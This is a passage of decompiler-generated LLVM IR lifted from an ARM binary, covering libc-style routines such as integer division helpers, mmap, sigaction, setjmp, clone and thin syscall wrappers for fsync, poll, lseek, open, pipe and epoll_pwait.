  %v1_226c8 = icmp slt i32 %v2_22620, 0
  br i1 %v1_226c8, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_226c8
  %v2_226cc = sub i32 0, %v1_226cc
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_226d4, %dec_label_pc_226c8, %bb100
  %v1_226d0 = phi i32 [ %v1_226cc, %dec_label_pc_226c8 ], [ %v2_226cc, %bb100 ], [ %arg1, %dec_label_pc_226d4 ], [ %v2_226d8, %bb101 ], [ %v1_226ec80, %bb103 ], [ %v2_226e8, %bb104 ]
  ret i32 %v1_226d0

dec_label_pc_226d4:                               ; preds = %thread-pre-split
  br i1 %v1_2261c, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_226d4
  %v2_226d8 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_226e0:                               ; preds = %bb86
  br i1 %v3_2263c, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_226e0
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_226e0, %bb102
  %v1_226ec80 = phi i32 [ %arg1, %dec_label_pc_226e0 ], [ 0, %bb102 ]
  br i1 %v9_2263c, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_226e4 = ashr i32 %v2_22620, 31
  %v2_226e8 = or i32 %v4_226e4, 1
  br label %.thread16

dec_label_pc_226f0:                               ; preds = %dec_label_pc_22644
  %v2_226f0 = icmp ugt i32 %v1_226f4, 65535
  br i1 %v2_226f0, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_226f0
  %v2_226f4 = and i32 %v1_226f4, 32768
  %v3_226f4 = icmp eq i32 %v2_226f4, 0
  %v4_226f4 = udiv i32 %v1_226f4, 65536
  br i1 %v3_226f4, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_226f0
  %v0_2270070 = phi i32 [ %v1_226f4, %dec_label_pc_226f0 ], [ %v4_226f4, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_22704 = phi i32 [ %v0_2270070, %.thread19 ], [ %v4_226f4, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_22700 = icmp ugt i32 %v1_22704, 255
  br i1 %v2_22700, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_22704 = and i32 %v1_22704, 128
  %v3_22704 = icmp eq i32 %v2_22704, 0
  %v4_22704 = udiv i32 %v1_22704, 256
  br i1 %v3_22704, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_22708 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_22714 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_22708, %bb108 ]
  %v1_22710 = phi i32 [ %v1_22704, %bb106 ], [ %v4_22704, %bb107 ], [ %v4_22704, %bb108 ]
  %v2_2270c = icmp ugt i32 %v1_22710, 15
  br i1 %v2_2270c, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_22710 = and i32 %v1_22710, 8
  %v3_22710 = icmp eq i32 %v2_22710, 0
  %v4_22710 = udiv i32 %v1_22710, 16
  br i1 %v3_22710, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_22714 = add nsw i32 %v1_22714, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_2271c = phi i32 [ %v1_22714, %.thread20 ], [ %v1_22714, %bb109 ], [ %v2_22714, %bb110 ]
  %v5_22720 = phi i32 [ %v1_22710, %.thread20 ], [ %v4_22710, %bb109 ], [ %v4_22710, %bb110 ]
  %v2_22718 = icmp ugt i32 %v5_22720, 3
  %v7_22718 = icmp eq i32 %v5_22720, 4
  %v2_2271c = xor i1 %v7_22718, true
  %v3_2271c = and i1 %v2_22718, %v2_2271c
  br i1 %v3_2271c, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_2271c = add nsw i32 %v4_2271c, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_22720 = phi i32 [ %v4_2271c, %.thread21 ], [ %v5_2271c, %bb111 ]
  %v2_22720 = xor i1 %v2_22718, true
  %v3_22720 = or i1 %v7_22718, %v2_22720
  br i1 %v3_22720, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_22720 = udiv i32 %v5_22720, 2
  %v9_22720 = add i32 %v4_22720, %v8_22720
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_22728 = phi i32 [ %v4_22720, %bb112 ], [ %v9_22720, %bb113 ]
  %v1_22724 = icmp slt i32 %v2_22620, 0
  %v6_22728 = lshr i32 %v0_22728, %v1_22728
  %v2_2272c = sub i32 0, %v6_22728
  %v2_2272c.v6_22728 = select i1 %v1_22724, i32 %v2_2272c, i32 %v6_22728
  ret i32 %v2_2272c.v6_22728

dec_label_pc_22734:                               ; preds = %entry
  %v0_22738 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_22720, { 1, 0 }
  uselistorder i1 %v7_22718, { 1, 0 }
  uselistorder i32 %v4_22710, { 1, 0 }
  uselistorder i32 %v1_22710, { 1, 0, 2, 3 }
  uselistorder i32 %v4_22704, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_22704, { 1, 0, 2, 3 }
  uselistorder i32 %v4_226f4, { 1, 0 }
  uselistorder i32 %v0_226b8, { 1, 0 }
  uselistorder i32 %v4_226ac, { 1, 0 }
  uselistorder i32 %v1_226b4, { 1, 2, 0 }
  uselistorder i32 %v4_226a0, { 1, 0 }
  uselistorder i32 %v1_226a8, { 1, 2, 0 }
  uselistorder i32 %v4_22694, { 1, 0 }
  uselistorder i32 %v1_2269c, { 1, 2, 0 }
  uselistorder i32 %v1_226c0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_22690, { 1, 0 }
  uselistorder i32 %v1_226bc, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_2267c, { 1, 0 }
  uselistorder i32 %v3_22678, { 1, 0 }
  uselistorder i32 %v1_22678, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_22674, { 1, 0 }
  uselistorder i32 %v1_2267c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_22668, { 1, 0 }
  uselistorder i32 %v4_22664, { 2, 1, 0 }
  uselistorder i32 %v1_22668, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_22670.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_2263c, { 1, 0 }
  uselistorder i32 %v1_226f4, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_22620, { 1, 0, 2 }
  uselistorder i32 %v0_2261c, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_226c8, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_22684, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22670thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_2274c = sdiv i32 %arg1, %arg2
  ret i32 %v2_2274c
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_22768 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_22768
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_22774 = load i32, i32* @r4, align 4
  store i32 %v3_22774, i32* %stack_var_-16, align 4
  %v3_22780 = urem i32 %arg3, 4096
  %v2_22784 = icmp eq i32 %v3_22780, 0
  br i1 %v2_22784, label %dec_label_pc_227a0, label %dec_label_pc_2278c

dec_label_pc_2278c:                               ; preds = %entry
  %v0_2278c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_22798 = inttoptr i32 %v0_2278c to i32*
  store i32 22, i32* %v2_22798, align 4
  %v0_227d0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_227d0

dec_label_pc_227a0:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_227cc, label %dec_label_pc_227bc

dec_label_pc_227bc:                               ; preds = %dec_label_pc_227a0
  %v0_227bc = call i32 @__GI___errno_location()
  %v0_227c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_227c0 = sub i32 0, %v0_227c0
  %v2_227c4 = inttoptr i32 %v0_227bc to i32*
  store i32 %v1_227c0, i32* %v2_227c4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_227cc

dec_label_pc_227cc:                               ; preds = %dec_label_pc_227a0, %dec_label_pc_227bc
  %v0_227cc = phi i32 [ %arg1, %dec_label_pc_227a0 ], [ -1, %dec_label_pc_227bc ]
  store i32 %v0_227cc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_227d0

dec_label_pc_227d0:                               ; preds = %dec_label_pc_2278c, %dec_label_pc_227cc
  %v0_227d0 = phi i32 [ %v0_227d0.pre, %dec_label_pc_2278c ], [ %v0_227cc, %dec_label_pc_227cc ]
  %v2_227d4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_227d4, i32* @r4, align 4
  ret i32 %v0_227d0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_227d0, { 1, 0 }
  uselistorder label %dec_label_pc_227cc, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_227dc = load i32, i32* @r4, align 4
  %v6_227dc = load i32, i32* @r5, align 4
  %v0_227e4 = load i32, i32* @r1, align 4
  store i32 %v0_227e4, i32* @ip, align 4
  %v2_227e4 = icmp eq i32 %v0_227e4, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_227f4 = load i32, i32* @r2, align 4
  store i32 %v0_227f4, i32* %r6.global-to-local, align 4
  br i1 %v2_227e4, label %dec_label_pc_22838, label %dec_label_pc_227fc

dec_label_pc_227fc:                               ; preds = %entry
  %v1_227fc = add i32 %v0_227e4, 4
  %v2_227fc = inttoptr i32 %v1_227fc to i32*
  %v3_227fc = load i32, i32* %v2_227fc, align 4
  store i32 %v3_227fc, i32* @r3, align 4
  %v1_22800 = and i32 %v3_227fc, 67108864
  %v2_22800 = icmp eq i32 %v1_22800, 0
  br i1 %v2_22800, label %dec_label_pc_22808, label %dec_label_pc_22838

dec_label_pc_22808:                               ; preds = %dec_label_pc_227fc
  store i32 20, i32* @r2, align 4
  %v2_2280c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_2280c, i32* @r0, align 4
  %v0_22810 = call i32 @memcpy()
  store i32 %v2_2280c, i32* @ip, align 4
  %v0_22838.pre = load i32, i32* @r5, align 4
  %v0_22840.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_22838

dec_label_pc_22838:                               ; preds = %dec_label_pc_227fc, %entry, %dec_label_pc_22808
  %v0_22840 = phi i32 [ %v0_227f4, %dec_label_pc_227fc ], [ %v0_227f4, %entry ], [ %v0_22840.pre, %dec_label_pc_22808 ]
  %v0_2283c = phi i32 [ %v0_227e4, %dec_label_pc_227fc ], [ 0, %entry ], [ %v2_2280c, %dec_label_pc_22808 ]
  %v0_22838 = phi i32 [ %arg1, %dec_label_pc_227fc ], [ %arg1, %entry ], [ %v0_22838.pre, %dec_label_pc_22808 ]
  %v4_22848 = call i32 @__syscall_rt_sigaction(i32 %v0_22838, i32 %v0_2283c, i32 %v0_22840, i32 8)
  store i32 %v3_227dc, i32* @r4, align 4
  store i32 %v6_227dc, i32* @r5, align 4
  ret i32 %v4_22848

; uselistorder directives
  uselistorder i32 %v0_227e4, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_22838, { 2, 0, 1 }
}

define i32 @function_2285c(i16* %arg1) local_unnamed_addr {
dec_label_pc_2285c:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_2285c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2285c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2285c
  %v5_2285c = sdiv i32 %tmp, 2
  %v6_2285c = and i32 %v5_2285c, %tmp
  %v2_22860 = trunc i32 %v6_2285c to i16
  %v4_22860 = inttoptr i32 %v6_2285c to i16*
  store i16 %v2_22860, i16* %v4_22860, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2285c, %bb
  %v8_22860 = phi i32 [ %tmp, %dec_label_pc_2285c ], [ 0, %bb ]
  ret i32 %v8_22860

; uselistorder directives
  uselistorder i32 %v6_2285c, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sigsetjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_0 = alloca i32, align 4
  %v2_22868 = load i32, i32* @r4, align 4
  store i32 %v2_22868, i32* %arg1, align 4
  %v3_22868 = add i32 %tmp, 4
  %v4_22868 = inttoptr i32 %v3_22868 to i32*
  %v5_22868 = load i32, i32* @r5, align 4
  store i32 %v5_22868, i32* %v4_22868, align 4
  %v6_22868 = add i32 %tmp, 8
  %v7_22868 = inttoptr i32 %v6_22868 to i32*
  %v8_22868 = load i32, i32* @r6, align 4
  store i32 %v8_22868, i32* %v7_22868, align 4
  %v9_22868 = add i32 %tmp, 12
  %v10_22868 = inttoptr i32 %v9_22868 to i32*
  %v11_22868 = load i32, i32* @r7, align 4
  store i32 %v11_22868, i32* %v10_22868, align 4
  %v12_22868 = add i32 %tmp, 16
  %v13_22868 = inttoptr i32 %v12_22868 to i32*
  %v14_22868 = load i32, i32* @r8, align 4
  store i32 %v14_22868, i32* %v13_22868, align 4
  %v15_22868 = add i32 %tmp, 20
  %v16_22868 = inttoptr i32 %v15_22868 to i32*
  %v17_22868 = load i32, i32* @sb, align 4
  store i32 %v17_22868, i32* %v16_22868, align 4
  %v18_22868 = add i32 %tmp, 24
  %v19_22868 = inttoptr i32 %v18_22868 to i32*
  %v20_22868 = load i32, i32* @sl, align 4
  store i32 %v20_22868, i32* %v19_22868, align 4
  %v21_22868 = add i32 %tmp, 28
  %v22_22868 = inttoptr i32 %v21_22868 to i32*
  %v23_22868 = load i32, i32* @fp, align 4
  store i32 %v23_22868, i32* %v22_22868, align 4
  %v24_22868 = add i32 %tmp, 32
  %v25_22868 = inttoptr i32 %v24_22868 to i32*
  %v27_22868 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_22868, i32* %v25_22868, align 4
  %v28_22868 = add i32 %tmp, 36
  %v29_22868 = inttoptr i32 %v28_22868 to i32*
  %v30_22868 = load i32, i32* @lr, align 4
  store i32 %v30_22868, i32* %v29_22868, align 4
  %v0_2286c = call i32 @__sigjmp_save()
  ret i32 %v0_2286c

; uselistorder directives
  uselistorder i32 %tmp, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_22884 = load i32, i32* @r0, align 4
  ret i32 %v0_22884
}

define i32 @__clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_22888 = load i32, i32* %r0.global-to-local, align 4
  %v2_22888 = icmp eq i32 %v0_22888, 0
  br i1 %v2_22888, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v3_2288c = icmp eq i32 %arg2, 0
  br i1 %v3_2288c, label %.thread2, label %dec_label_pc_22898

.thread2:                                         ; preds = %bb
  store i32 -22, i32* @r0, align 4
  br label %dec_label_pc_228e8

bb7:                                              ; preds = %entry
  store i32 -22, i32* @r0, align 4
  br label %dec_label_pc_228e8

dec_label_pc_22898:                               ; preds = %bb
  %v1_22898 = add i32 %arg2, -8
  store i32 %v1_22898, i32* %r1.global-to-local, align 4
  %v2_2289c = add i32 %arg2, -4
  %v3_2289c = inttoptr i32 %v2_2289c to i32*
  store i32 %arg4, i32* %v3_2289c, align 4
  %v0_228a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_228a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_228a0 = inttoptr i32 %v1_228a0 to i32*
  store i32 %v0_228a0, i32* %v2_228a0, align 4
  store i32 %arg3, i32* @r0, align 4
  %v3_228a8 = load i32, i32* @r4, align 4
  %v3_228ac = load i32, i32* %stack_var_0, align 4
  %v1_228c8 = icmp slt i32 %arg3, 0
  br i1 %v1_228c8, label %dec_label_pc_228e8, label %dec_label_pc_228d0

dec_label_pc_228d0:                               ; preds = %dec_label_pc_22898
  %v2_228c8 = icmp eq i32 %arg3, 0
  br i1 %v2_228c8, label %bb9, label %bb8

bb8:                                              ; preds = %dec_label_pc_228d0
  store i32 %v3_228a8, i32* @r4, align 4
  ret i32 %arg3

bb9:                                              ; preds = %dec_label_pc_228d0
  store i32 %v3_228ac, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_228a8)
  %v1_228e4 = call i32 @__GI__exit(i32 %v3_228ac)
  store i32 %v1_228e4, i32* @r0, align 4
  br label %dec_label_pc_228e8

dec_label_pc_228e8:                               ; preds = %bb7, %.thread2, %dec_label_pc_22898, %bb9
  %v0_228e8 = call i32 @__syscall_error()
  store i32 %v0_228e8, i32* %r0.global-to-local, align 4
  ret i32 %v0_228e8

; uselistorder directives
  uselistorder i32 %v3_228ac, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder i32 -22, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_228e8, { 3, 2, 0, 1 }
}

define i32 @sched_setscheduler(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_228ec = load i32, i32* @r7, align 4
  store i32 %v3_228ec, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_22914, label %dec_label_pc_22904

dec_label_pc_22904:                               ; preds = %entry
  %v0_22904 = call i32 @__GI___errno_location()
  %v0_22908 = load i32, i32* %r7.global-to-local, align 4
  %v1_22908 = sub i32 0, %v0_22908
  %v2_2290c = inttoptr i32 %v0_22904 to i32*
  store i32 %v1_22908, i32* %v2_2290c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_22918.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22914

dec_label_pc_22914:                               ; preds = %entry, %dec_label_pc_22904
  %v2_22918 = phi i32 [ %v3_228ec, %entry ], [ %v2_22918.pre, %dec_label_pc_22904 ]
  %v0_22914 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_22904 ]
  store i32 %v2_22918, i32* @r7, align 4
  ret i32 %v0_22914

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22914, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_22930 = load i32, i32* @r0, align 4
  ret i32 %v1_22930
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22934 = load i32, i32* @r7, align 4
  store i32 %v3_22934, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_2295c, label %dec_label_pc_2294c

dec_label_pc_2294c:                               ; preds = %entry
  %v0_2294c = call i32 @__GI___errno_location()
  %v0_22950 = load i32, i32* %r7.global-to-local, align 4
  %v1_22950 = sub i32 0, %v0_22950
  %v2_22954 = inttoptr i32 %v0_2294c to i32*
  store i32 %v1_22950, i32* %v2_22954, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_22960.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2295c

dec_label_pc_2295c:                               ; preds = %entry, %dec_label_pc_2294c
  %v2_22960 = phi i32 [ %v3_22934, %entry ], [ %v2_22960.pre, %dec_label_pc_2294c ]
  %v0_2295c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_2294c ]
  store i32 %v2_22960, i32* %r7.global-to-local, align 4
  ret i32 %v0_2295c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2295c, { 1, 0 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22968 = load i32, i32* @r7, align 4
  store i32 %v3_22968, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_22990, label %dec_label_pc_22980

dec_label_pc_22980:                               ; preds = %entry
  %v0_22980 = call i32 @__GI___errno_location()
  %v0_22984 = load i32, i32* %r7.global-to-local, align 4
  %v1_22984 = sub i32 0, %v0_22984
  %v2_22988 = inttoptr i32 %v0_22980 to i32*
  store i32 %v1_22984, i32* %v2_22988, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_22994.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22990

dec_label_pc_22990:                               ; preds = %entry, %dec_label_pc_22980
  %v2_22994 = phi i32 [ %v3_22968, %entry ], [ %v2_22994.pre, %dec_label_pc_22980 ]
  %v0_22990 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_22980 ]
  store i32 %v2_22994, i32* @r7, align 4
  ret i32 %v0_22990

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22990, { 1, 0 }
}

define i32 @__libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2299c = load i32, i32* @r7, align 4
  store i32 %v3_2299c, i32* %stack_var_-8, align 4
  %v0_229a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_229a8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_229a8, -4095
  br i1 %tmp, label %dec_label_pc_229c8, label %dec_label_pc_229b8

dec_label_pc_229b8:                               ; preds = %entry
  %v0_229b8 = call i32 @__GI___errno_location()
  %v0_229bc = load i32, i32* %r7.global-to-local, align 4
  %v1_229bc = sub i32 0, %v0_229bc
  %v2_229c0 = inttoptr i32 %v0_229b8 to i32*
  store i32 %v1_229bc, i32* %v2_229c0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_229c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_229c8

dec_label_pc_229c8:                               ; preds = %entry, %dec_label_pc_229b8
  %v1_229cc = phi i32 [ %v0_229a8, %entry ], [ -1, %dec_label_pc_229b8 ]
  %v2_229c8 = phi i32 [ %v3_2299c, %entry ], [ %v2_229c8.pre, %dec_label_pc_229b8 ]
  store i32 %v2_229c8, i32* @r7, align 4
  ret i32 %v1_229cc

; uselistorder directives
  uselistorder i32 %v0_229a8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_229c8, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_229d0 = load i32, i32* @r2, align 4
  %v9_229d0 = load i32, i32* @r3, align 4
  store i32 %v9_229d0, i32* %stack_var_-4, align 4
  %v1_229e0 = and i32 %arg2, 64
  %v2_229e0 = icmp eq i32 %v1_229e0, 0
  br i1 %v2_229e0, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_229e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_229e8, i32* @r3, align 4
  %phitmp = urem i32 %v6_229d0, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_229ec = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_229ec, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_22a1c, label %dec_label_pc_22a0c

dec_label_pc_22a0c:                               ; preds = %.thread
  %v0_22a0c = call i32 @__GI___errno_location()
  %v0_22a10 = load i32, i32* %r7.global-to-local, align 4
  %v1_22a10 = sub i32 0, %v0_22a10
  store i32 %v1_22a10, i32* @r3, align 4
  %v2_22a14 = inttoptr i32 %v0_22a0c to i32*
  store i32 %v1_22a10, i32* %v2_22a14, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_22a1c

dec_label_pc_22a1c:                               ; preds = %.thread, %dec_label_pc_22a0c
  %v0_22a1c = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_22a0c ]
  ret i32 %v0_22a1c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22a1c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22a30 = load i32, i32* @r7, align 4
  store i32 %v3_22a30, i32* %stack_var_-8, align 4
  %v0_22a3c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22a3c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22a3c, -4095
  br i1 %tmp, label %dec_label_pc_22a5c, label %dec_label_pc_22a4c

dec_label_pc_22a4c:                               ; preds = %entry
  %v0_22a4c = call i32 @__GI___errno_location()
  %v0_22a50 = load i32, i32* %r7.global-to-local, align 4
  %v1_22a50 = sub i32 0, %v0_22a50
  %v2_22a54 = inttoptr i32 %v0_22a4c to i32*
  store i32 %v1_22a50, i32* %v2_22a54, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22a5c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22a5c

dec_label_pc_22a5c:                               ; preds = %entry, %dec_label_pc_22a4c
  %v1_22a60 = phi i32 [ %v0_22a3c, %entry ], [ -1, %dec_label_pc_22a4c ]
  %v2_22a5c = phi i32 [ %v3_22a30, %entry ], [ %v2_22a5c.pre, %dec_label_pc_22a4c ]
  store i32 %v2_22a5c, i32* @r7, align 4
  ret i32 %v1_22a60

; uselistorder directives
  uselistorder i32 %v0_22a3c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22a5c, { 1, 0 }
}

define i32 @__libc_epoll_pwait(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_22a64 = load i32, i32* @r4, align 4
  store i32 %v3_22a64, i32* %stack_var_-16, align 4
  %v0_22a78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22a78, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22a78, -4095
  br i1 %tmp, label %dec_label_pc_22a98, label %dec_label_pc_22a88

dec_label_pc_22a88:                               ; preds = %entry
